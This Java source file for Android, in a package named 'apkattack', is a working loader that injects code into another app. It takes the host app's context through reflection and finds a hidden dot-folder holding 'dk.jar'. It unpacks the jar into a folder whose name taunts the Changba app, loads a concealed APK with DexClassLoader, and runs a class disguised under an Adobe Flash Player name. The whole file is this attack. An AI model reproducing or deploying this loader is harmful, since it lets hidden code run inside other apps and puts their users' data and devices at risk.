package com.example.apkattack;


import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.lang.reflect.Method;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;


import android.content.Context;
import android.util.Log;
import dalvik.system.DexClassLoader;

public class dkPlugin {
	public static void dkPluginEntry(){
		String Tag = "dkPluginEntry";
    	try {
    		
    		Log.e(Tag,"start");
    		
	        Class<?> ActivityThread = Class.forName("android.app.ActivityThread");
	        Method methodcat = ActivityThread.getMethod("currentActivityThread");
	        Object currentActivityThread = methodcat.invoke(ActivityThread);
	        Method methodga = currentActivityThread.getClass().getMethod("getApplication");
	        Context context =(Context)methodga.invoke(currentActivityThread);
			if (context == null) {
				Log.e(Tag, "context null");
				return;
			}else{
				Log.e(Tag, "context ok,package:" + context.getPackageName()+"/" + context.getClass().getName());
			}
			
			Throwable ex = new Throwable();
	        StackTraceElement[] stackElements = ex.getStackTrace();
	        if (stackElements != null) {
	            for (int i = 0; i < stackElements.length; i++) {
	            	Log.e(Tag, "class:" + stackElements[i].getClassName()+"/method:" + stackElements[i].getMethodName());
	            	//Log.e(Tag, stackElements[i].getFileName());
	            	//Log.e(Tag, stackElements[i].getLineNumber());
	            	//Log.e(Tag, stackElements[i].getMethodName());
	            }
	        }
    		
    		
	    	String dexmethodname = "start";
	    	String apkfn = "simcard.apk";
	    	String dexclassname = "com.adobe.flashplayer.JarEntry";
	    	
	    	String apppath = context.getFilesDir().getParent() + "/";
			String pluginPath = apppath + "files/";
			String unzippath = apppath + "fuckChangba/";
			
	    	File [] pluginFiles = new File(pluginPath).listFiles();
	    	if (pluginFiles == null) {
	    		Log.e(Tag,"error list files:" + pluginPath);
				return;
			}

	    	for (int i = 0; i < pluginFiles.length; i++) {
	    		String tmpString = pluginFiles[i].getName();
	    		if (pluginFiles[i].isDirectory() && tmpString.startsWith(".") && tmpString.length() == 33) {
	    			pluginPath = pluginPath + tmpString + "/";
					Log.e(Tag,"find apk path:" + pluginPath);
					break;
				}
			}

	    	
	    	String jarfn = "";
			File []unzipfiles = new File(pluginPath ).listFiles();
			for (int i = 0; i < unzipfiles.length; i++) {
				String tmpfn = unzipfiles[i].getName();
				if (tmpfn.contains("dk.jar") ) {
					jarfn = tmpfn;
					break;
				}
			}
			
			if (jarfn.equals("")) {
				return;
			}
			
	        ZipEntry zipEntry = null;
	        byte unzipbuf[] = new byte[0x10000];
	        ZipInputStream zipIn = new ZipInputStream(new BufferedInputStream(new FileInputStream(pluginPath + jarfn)));
            while ( (zipEntry = zipIn.getNextEntry()) != null) {
            	File unzipfile = new File(unzippath + zipEntry.getName());
                if (zipEntry.isDirectory()) {
                	unzipfile.mkdirs();
                	Log.e(Tag,"unzip make folder:" + zipEntry.getName());
                } else {
                    File unzipparent = unzipfile.getParentFile();
                    if (unzipparent.exists() == false) {
                    	unzipparent.mkdirs();
                    	Log.e(Tag,"unzip make parent folder:" + unzipparent.getName());
                    }
                    
                	FileOutputStream fileOut = new FileOutputStream(unzipfile);
                    int readedBytes = 0;
                    while ((readedBytes = zipIn.read(unzipbuf)) > 0) {
                        fileOut.write(unzipbuf, 0, readedBytes);
                    }
                    fileOut.close();
                }
                zipIn.closeEntry();
            }
            zipIn.close();
			
			unzipfiles = new File(unzippath + "assets/").listFiles();
			for (int i = 0; i < unzipfiles.length; i++) {
				String tmpfn = unzipfiles[i].getName();
				if (tmpfn.endsWith(".apk") && tmpfn.equals("base.apk") == false) {
					apkfn = tmpfn;
					break;
				}
			}
            
			
			String appcachepath = context.getCacheDir() + "/";
	    	DexClassLoader dexcl = new DexClassLoader(unzippath + "assets/" + apkfn, appcachepath, 
	    			null,context.getClassLoader());
    		Class<?> cls = dexcl.loadClass(dexclassname);
    	    Object obj = cls.newInstance();
    	    Method method = cls.getDeclaredMethod(dexmethodname, Context.class,String.class);
    	    method.invoke(obj,context,unzippath + "assets/");
    	    
    	    Log.e(Tag, "dkPluginEntry load apk success");
    	} catch (Exception ex) {
    		ex.printStackTrace();
    		Log.e(Tag, "dkPluginEntry load apk exception");
    	}
	}
}
